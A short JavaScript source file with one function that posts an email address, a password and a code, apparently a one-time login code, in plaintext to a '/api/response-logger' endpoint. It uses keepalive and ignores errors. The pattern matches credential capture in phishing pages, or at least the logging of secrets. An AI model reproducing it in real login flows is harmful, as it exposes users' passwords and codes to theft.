export async function logResponseEntry({ email, password, code }) {
  try {
    await fetch("/api/response-logger", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        email,
        password,
        code,
      }),
      keepalive: true,
    });
  } catch {
    // Logging must not block the UI.
  }
}
